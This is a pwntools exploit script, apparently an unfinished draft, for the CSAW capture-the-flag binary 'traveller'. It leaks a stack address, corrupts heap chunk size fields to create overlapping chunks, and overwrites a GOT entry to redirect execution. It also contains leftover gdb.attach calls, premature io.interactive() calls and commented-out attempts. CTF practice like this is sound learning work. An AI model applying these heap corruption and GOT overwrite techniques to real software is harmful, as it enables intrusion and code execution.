from pwn import *
#io=remote("pwn.chal.csaw.io",1003)
io=process("./traveller",env = {"LD_PRELOAD" : "./libc-2.23.so"})
io.recvuntil("Welcome to trip management system. \n")
leak = io.recv(14)
leak = int(leak,16)
log.info("stack leak = " + hex(leak))
def add(choice,payload):
   io.send('1'.ljust(4,"\x00"))
   io.send(str(choice).ljust(4,"\x00"))
   if(choice==1):
       size=0x80
   elif(choice==2):
       size=0x110
   elif(choice==3):
       size=0x128
   elif(choice==4):
       size=0x150
   elif(choice==5):
       size=0x200
   io.send(payload.ljust(size,"\x00"))
def free(index):
   io.send('2'.ljust(4,"\x00"))
   io.send(str(index).ljust(0x14,"\x00"))
def edit(choice,payload):
   io.send('3'.ljust(4,"\x00"))
   io.send(str(choice).ljust(0x14,"\x00"))
   io.send(payload)
def view(index):
   io.send('4'.ljust(4,"\x00"))
   io.sendlineafter("view? \n",str(index))
add(2,'a'*0x80)
gdb.attach(io)
io.interactive()
add(3,'b'*0x80)
free(0)
add(1,"c"*50)
b="d"*(0x200-16)+p64(0)+p64(0x51)
add(5,b)
io.sendline()
p="1"*288+p64(0x1a0)
edit(0,p)
c="2"*48+p64(0)+p64(0x51)

log.info("hello")
raw_input()
io.send('1'.ljust(4,"\x00"))
io.sendline(str(3))
gdb.attach(io)
io.sendline(c)
io.interactive()
#got=0x602058
got=0x0000000000602028
payload="1"*64+p64(0x50)+p64(0x20)+p64(got)+p64(8)
free(2)
add(3,payload)
#gdb.attach(io,"b*0x400c88")
io.sendlineafter("> ",'2')
io.sendline("0")
log.info("hello")
raw_input()
io.send(p64(0x4008b6))
#edit("0",p64(0x00000000004008b6))
#io.sendline(p64(0x00000000004008b6))
#add(2,"c"*50)
#add()
#add(1,'c'*0x10)
#edit()
io.interactive()
